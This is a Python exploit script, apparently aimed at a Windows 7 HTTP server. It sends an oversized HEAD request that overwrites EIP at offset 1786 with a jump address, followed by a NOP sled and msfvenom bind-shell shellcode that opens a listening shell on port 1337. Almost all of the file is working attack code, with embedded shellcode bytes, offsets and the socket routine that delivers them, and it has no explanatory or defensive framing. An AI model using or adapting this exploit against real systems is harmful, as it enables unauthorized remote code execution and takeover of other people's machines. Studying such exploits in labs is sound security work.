#!/usr/bin/python3
import socket
import sys
from pwn import *

"""
Tested On: Windows 7
"""

"""
HEAD / HTTP/1.1\r\nHost: 192.168.5.128\r\nUser-Agent: curl/7.67.0\r\nAccept: */*\r\n\r\n"""
host = '192.168.5.128'
port = 80

# Shellcode: msfvenom -p windows/shell_bind_tcp LPORT=1337 --platform windows --arch x86 --format python -b "\x00,\x0d"
buf =  b""
buf += b"\xd9\xc0\xd9\x74\x24\xf4\xb8\x28\xf8\xdc\xe5\x5b\x2b"
buf += b"\xc9\xb1\x53\x31\x43\x17\x03\x43\x17\x83\xeb\xfc\x3e"
buf += b"\x10\x17\x14\x3c\xdb\xe7\xe5\x21\x55\x02\xd4\x61\x01"
buf += b"\x47\x47\x52\x41\x05\x64\x19\x07\xbd\xff\x6f\x80\xb2"
buf += b"\x48\xc5\xf6\xfd\x49\x76\xca\x9c\xc9\x85\x1f\x7e\xf3"
buf += b"\x45\x52\x7f\x34\xbb\x9f\x2d\xed\xb7\x32\xc1\x9a\x82"
buf += b"\x8e\x6a\xd0\x03\x97\x8f\xa1\x22\xb6\x1e\xb9\x7c\x18"
buf += b"\xa1\x6e\xf5\x11\xb9\x73\x30\xeb\x32\x47\xce\xea\x92"
buf += b"\x99\x2f\x40\xdb\x15\xc2\x98\x1c\x91\x3d\xef\x54\xe1"
buf += b"\xc0\xe8\xa3\x9b\x1e\x7c\x37\x3b\xd4\x26\x93\xbd\x39"
buf += b"\xb0\x50\xb1\xf6\xb6\x3e\xd6\x09\x1a\x35\xe2\x82\x9d"
buf += b"\x99\x62\xd0\xb9\x3d\x2e\x82\xa0\x64\x8a\x65\xdc\x76"
buf += b"\x75\xd9\x78\xfd\x98\x0e\xf1\x5c\xf5\xe3\x38\x5e\x05"
buf += b"\x6c\x4a\x2d\x37\x33\xe0\xb9\x7b\xbc\x2e\x3e\x7b\x97"
buf += b"\x97\xd0\x82\x18\xe8\xf9\x40\x4c\xb8\x91\x61\xed\x53"
buf += b"\x61\x8d\x38\xc9\x69\x28\x93\xec\x94\x8a\x43\xb1\x36"
buf += b"\x63\x8e\x3e\x69\x93\xb1\x94\x02\x3c\x4c\x17\x29\x84"
buf += b"\xd9\xf1\x5b\xe6\x8f\xaa\xf3\xc4\xeb\x62\x64\x36\xde"
buf += b"\xda\x02\x7f\x08\xdc\x2d\x80\x1e\x4a\xb9\x0b\x4d\x4e"
buf += b"\xd8\x0b\x58\xe6\x8d\x9c\x16\x67\xfc\x3d\x26\xa2\x96"
buf += b"\xde\xb5\x29\x66\xa8\xa5\xe5\x31\xfd\x18\xfc\xd7\x13"
buf += b"\x02\x56\xc5\xe9\xd2\x91\x4d\x36\x27\x1f\x4c\xbb\x13"
buf += b"\x3b\x5e\x05\x9b\x07\x0a\xd9\xca\xd1\xe4\x9f\xa4\x93"
buf += b"\x5e\x76\x1a\x7a\x36\x0f\x50\xbd\x40\x10\xbd\x4b\xac"
buf += b"\xa1\x68\x0a\xd3\x0e\xfd\x9a\xac\x72\x9d\x65\x67\x37"
buf += b"\xad\x2f\x25\x1e\x26\xf6\xbc\x22\x2b\x09\x6b\x60\x52"
buf += b"\x8a\x99\x19\xa1\x92\xe8\x1c\xed\x14\x01\x6d\x7e\xf1"
buf += b"\x25\xc2\x7f\xd0"



buffer = b"A" * 1786
buffer += p32(0x769B9C77)
buffer += b"\x90" * 20
buffer += buf
buffer += b"\xCC" * (5000-len(buffer))

"""
Offsets
EIP -> 1786
769B9C77
"""

data = b'HEAD '
data += buffer
data += b" HTTP/1.1\r\n"
data += b"Host: 192.168.5.128\r\n\r\n"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print("[+]Length of Buffer: " + str(len(buffer)))
print("[+]Sending Exploit")
s.send(data)
s.close()